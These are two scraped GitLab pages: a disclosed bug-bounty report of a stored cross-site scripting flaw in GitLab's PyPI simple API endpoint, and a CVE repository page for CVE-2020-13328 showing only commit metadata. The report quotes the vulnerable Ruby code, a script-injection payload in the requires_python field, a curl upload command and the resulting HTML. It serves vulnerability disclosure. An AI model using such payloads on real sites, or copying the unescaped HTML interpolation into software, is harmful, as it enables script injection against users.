=== Content from gitlab.com_c8b112e4_20250119_115032.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS on PyPi simple API endpoint

**[HackerOne report #856836](https://hackerone.com/reports/856836)** by `vakzz` on 2020-04-23, assigned to [@dcouture](/dcouture "Dominic Couture"):

### Summary

The recently released PyPi package feature has a new endpoint at `/api/:version/projects/:id/packages/pypi/simple/*package_name` which exposes an HTML page listing the package versions. The `package_link`'s are generated using the following code:

[package\_presenter.rb#L50](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/presenters/packages/pypi/package_presenter.rb#L50)

```
      def package_link(url, required_python, filename)
        "<a href=\"#{url}\" data-requires-python=\"#{required_python}\">#{filename}</a><br>"
      end
```

The only sanitation on `required_python` is that it is less than 50 characters (db constraint), otherwise arbitrary html can be injected.

### Steps to reproduce

1. Create project
2. Create a pypi package with `requires_python='"><script>alert(1)</script>'`

curl -v "https://**token**:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires\_python=2.7 -F version=1 -F name='package\_test\_1' -F requires\_python='">'

````

1. Visit the simple api endpoint and see the injected code: <https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1>

   ```
       <!DOCTYPE html>
       <html>
         <head>
           <title>Links for package_test_1</title>
         </head>
         <body>
           <h1>Links for package_test_1</h1>
           <a href="https://gitlab.com/api/v4/projects/18315917/packages/pypi/files/lala.txt#sha256=" data-requires-python=""><script>alert(1)</script>">lala.txt</a><br>
         </body>
       </html>
   ```

Currently will be blocked by the csp on gitlab.com

### Impact

* An attacker could execute arbitrary javascript by sending a user or getting them to click on a url to the simple api endpoint

### Examples

* <https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1>

### What is the current *bug* behavior?

The user supplied fields used by the `package_presenter` are not all sanitized

### What is the expected *correct* behavior?

All of the user supplied fields in `package_presenter` should be sanitized before being turned into html

### Output of checks

This bug happens on GitLab.com

## Impact

* An attacker could execute arbitrary javascript by sending a user or getting them to click on a url to the simple api endpoint

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_0a8e0f0e_20250119_115031.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-13328.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-13328.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-13328.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-13328.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Sep 29, 2020

  [e14b18f4](/gitlab-org/cves/-/commit/e14b18f4e167be07e69d68b2c6856801b3f2dbaa)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/e14b18f4e167be07e69d68b2c6856801b3f2dbaa)
  繚
  e14b18f4

  [ GitLab Bot ](/gitlab-bot) authored Sep 29, 2020

  e14b18f4

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/e14b18f4e167be07e69d68b2c6856801b3f2dbaa)
  [ GitLab Bot ](/gitlab-bot) authored Sep 29, 2020

Loading


